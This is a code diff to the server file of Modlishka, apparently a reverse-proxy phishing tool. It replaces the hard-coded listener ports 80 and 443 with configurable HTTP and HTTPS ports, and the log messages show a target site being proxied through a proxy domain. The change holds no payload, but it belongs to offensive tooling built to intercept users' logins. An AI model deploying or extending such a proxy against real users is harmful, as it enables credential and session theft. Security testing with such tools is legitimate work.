@@ -26,6 +26,7 @@ import (
 	"github.com/drk1wi/Modlishka/runtime"
 	"net"
 	"net/http"
+	"strconv"
 )
 
 var ServerRuntimeConfig *ServerConfig
@@ -203,7 +204,9 @@ func RunServer() {
 	plugin.RegisterHandler(ServerRuntimeConfig.Handler)
 
 	var listener= string(*ServerRuntimeConfig.ListeningAddress)
-
+	var portHTTP = strconv.Itoa(*ServerRuntimeConfig.ListeningPortHTTP)
+	var portHTTPS = strconv.Itoa(*ServerRuntimeConfig.ListeningPortHTTPS)
+	
 	welcome := fmt.Sprintf(`
 %s
 
@@ -213,7 +216,7 @@ Author: Piotr Duszynski @drk1wi
 
 	if *ServerRuntimeConfig.ForceHTTP  {
 
-		var httplistener = listener + ":80"
+		var httplistener = listener + ":" + portHTTP
 		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via --> [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)
 		log.Infof("%s", welcome)
 
@@ -234,7 +237,7 @@ Author: Piotr Duszynski @drk1wi
 
 		embeddedTLSServer.Handler = ServerRuntimeConfig.Handler
 
-		var httpslistener= listener + ":443"
+		var httpslistener= listener + ":" + portHTTPS
 
 		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)
 
@@ -260,11 +263,11 @@ Author: Piotr Duszynski @drk1wi
 			var HTTPServerRuntimeConfig = &ServerConfig{
 				Options: ServerRuntimeConfig.Options,
 				Handler: ServerRuntimeConfig.Handler,
-				Port:    "80",
+				Port:    portHTTP,
 			}
 
-			var httpslistener= listener + ":443"
-			var httplistener= listener + ":80"
+			var httpslistener= listener + ":" + portHTTPS
+			var httplistener= listener + ":" + portHTTP
 
 			welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)
 			welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)
